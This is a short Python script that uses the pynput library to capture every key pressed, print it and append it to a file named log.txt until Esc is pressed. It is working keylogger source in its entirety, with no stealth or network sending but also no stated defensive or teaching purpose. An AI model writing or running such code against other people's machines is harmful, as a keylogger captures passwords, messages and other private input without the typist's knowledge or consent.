import pynput 

from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key):
    global keys, count
    
    keys.append(key)
    count+=1
    print("{} pressed".format(key))
    write_to_file(key)

def release(key):
    if key is Key.esc:
        return False
    
def write_to_file(key):
    with open('log.txt', 'a') as f:
        k = str(key).replace("'","") #remove ' from output file
        if k.find("space") > 0:    
            f.write(' ')
        elif k.find("enter") > 0:    
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)

with Listener(on_press=press, on_release=release) as listener:
    listener.join()